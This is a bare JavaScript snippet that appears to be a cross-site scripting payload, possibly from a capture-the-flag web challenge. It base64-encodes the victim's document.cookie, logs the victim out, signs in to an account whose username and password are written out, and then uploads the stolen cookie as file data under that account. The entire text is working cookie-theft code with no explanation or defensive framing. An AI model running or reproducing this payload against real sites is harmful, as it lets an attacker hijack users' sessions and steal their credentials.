aaa=btoa(document.cookie);
fetch("/user/logout").then(e=>{
 fetch("/signin",{
    method: "POST",
    headers: {
    "Content-Type": "application/x-www-form-urlencoded",
    },
     body: "uid=arang&upw=dkfkd3"
    }).then(e=>{
      fetch("/user/upload", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "filename=asdf2&data="+aaa,
})
})
})
